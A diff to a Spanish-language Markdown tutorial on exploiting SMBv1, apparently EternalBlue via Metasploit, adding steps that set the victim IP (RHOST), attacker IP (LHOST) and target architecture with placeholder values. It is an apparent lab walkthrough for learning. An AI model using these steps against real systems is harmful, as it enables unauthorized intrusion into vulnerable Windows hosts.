@@ -36,5 +36,21 @@ SMBv1 es un protocolo de red antiguo utilizado para compartir archivos y carpeta
    show options
    ```
    ![EB-2](img/EB-2.png)
+   Como vemos debemos setear:
+   * RHOST: ip de la victima.
+     ```bash
+     set RHOST {ip_victim}
+     ```
+   * LHOST: ip del atacante.
+     ```bash
+     set LHOST {ip_attacker}
+     ```
+     Aquí ya tenemos una ip verificar que sea la nuestra.
+   * Target: es la configuración específica que le indica al exploit cómo debe comportarse según el sistema operativo y       la arquitectura de la víctima (x86 o x64).
+     ```bash
+     set TARGET 1
+     ```
+
+
    
    
